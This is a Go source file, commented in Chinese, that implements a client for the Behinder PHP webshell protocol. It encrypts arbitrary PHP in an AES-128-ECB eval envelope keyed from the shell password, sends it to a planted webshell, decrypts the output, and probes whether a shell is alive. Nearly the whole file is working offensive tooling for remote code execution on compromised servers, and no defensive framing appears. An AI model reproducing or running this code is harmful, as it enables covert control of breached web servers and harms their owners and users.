// 原生冰蝎兼容通道(behinder,PHP / AES-ECB 默认形态):
//   密钥 key = md5(连接密码)[0:16];请求体 = base64( AES-128-ECB( "eval(base64_decode('<b64>'));" ) )
//   响应 = base64( AES-128-ECB( {"status":b64,"msg":b64} ) )
// 桥接载荷路线:不内嵌外部载荷文件——main($whatever,$code) 契约经 eval 捕获输出,
// 由此获得完整 eval 能力(结构化文件/数据库操作走片段库)。
package webshellproto

import (
	"encoding/json"
	"fmt"
	"regexp"
	"strings"
)

const behinderBridgePayload = `
function main($whatever, $code) {
    $out = '';
    ob_start();
    try { eval($code); } catch (Throwable $e) {}
    $out = ob_get_clean();
    echo encrypt(json_encode(array("status" => base64_encode("success"), "msg" => base64_encode($out))));
}
`

func behinderKey(conn *Conn) []byte {
	return []byte(MD5Hex(conn.Password)[:16])
}

var mainParamsRe = regexp.MustCompile(`main\s*\([^)]*\)`)
var phpVarRe = regexp.MustCompile(`\$([a-zA-Z]\w*)`)

func mainParamsOf(script string) []string {
	m := mainParamsRe.FindString(script)
	if m == "" {
		return nil
	}
	seen := map[string]bool{}
	var out []string
	for _, name := range phpVarRe.FindAllStringSubmatch(m, -1) {
		if !seen[name[1]] {
			seen[name[1]] = true
			out = append(out, name[1])
		}
	}
	return out
}

// BehinderSendPayload 按契约拼装并发送载荷,返回解密后的 msg 明文。
// script 为 PHP 载荷(不含 <?),须定义 main($…)。
func BehinderSendPayload(conn *Conn, script string, params map[string]string) ([]byte, error) {
	key := behinderKey(conn)
	code := strings.TrimPrefix(script, "<?php")
	code = strings.TrimPrefix(code, "<?=")
	code = strings.TrimPrefix(code, "<?")
	code = strings.TrimSpace(code)
	// encrypt 函数注入(载荷以 echo encrypt(...) 收尾——响应加密面)
	code += "\nfunction encrypt($data){return base64_encode(openssl_encrypt($data,'AES-128-ECB','" + string(key) + "',OPENSSL_RAW_DATA));}\n"
	var args []string
	for _, name := range mainParamsOf(script) {
		v := params[name]
		code += "$" + name + `="` + B64([]byte(v)) + `";$` + name + "=base64_decode($" + name + ");\n"
		args = append(args, "$"+name)
	}
	code += "\r\nmain(" + strings.Join(args, ",") + ");"
	// 原版客户端信封带 "assert|" 前缀(PHP 8 起致命)——马侧只 eval 解密内容,
	// 直接发 eval 信封(PHP 5-8 全兼容)
	envelope := `eval(base64_decode('` + B64([]byte(code)) + `'));`
	ct, err := aesECBEncrypt(key, []byte(envelope))
	if err != nil {
		return nil, err
	}
	headers := map[string]string{"Content-Type": "application/octet-stream"}
	for k, v := range conn.Headers {
		headers[k] = v
	}
	res, err := HTTPDo("POST", conn.URL, headers, []byte(B64(ct)), conn.timeout())
	if err != nil {
		return nil, err
	}
	if res.Status != 200 {
		return nil, fmt.Errorf("马侧拒绝(HTTP %d——密码/形态不符或马不存在)", res.Status)
	}
	rawCT, err := Unb64(string(res.Body))
	if err != nil {
		return nil, fmt.Errorf("响应解密失败——密钥可能不匹配")
	}
	plain, err := aesECBDecrypt(key, rawCT)
	if err != nil {
		return nil, fmt.Errorf("响应解密失败——密钥可能不匹配")
	}
	var jsonResp struct {
		Status string `json:"status"`
		Msg    string `json:"msg"`
	}
	if err := json.Unmarshal(plain, &jsonResp); err != nil {
		return nil, fmt.Errorf("响应解密失败——密钥可能不匹配")
	}
	status, _ := Unb64(jsonResp.Status)
	if string(status) != "success" {
		return nil, fmt.Errorf("载荷执行失败:%s", string(status))
	}
	msg, err := Unb64(jsonResp.Msg)
	if err != nil {
		return nil, fmt.Errorf("响应解码失败")
	}
	return msg, nil
}

// BehinderEval eval PHP 代码(桥接载荷)。
func BehinderEval(conn *Conn, code string) (string, error) {
	out, err := BehinderSendPayload(conn, behinderBridgePayload, map[string]string{"code": code})
	return string(out), err
}

// BehinderProbe 探测。
func BehinderProbe(conn *Conn) bool {
	token := ProbeToken("WSMP")
	probe := &Conn{}
	*probe = *conn
	probe.TimeoutMs = minInt(conn.TimeoutMs, 8000)
	out, err := BehinderEval(probe, `echo "`+token+`";`)
	return err == nil && strings.Contains(out, token)
}
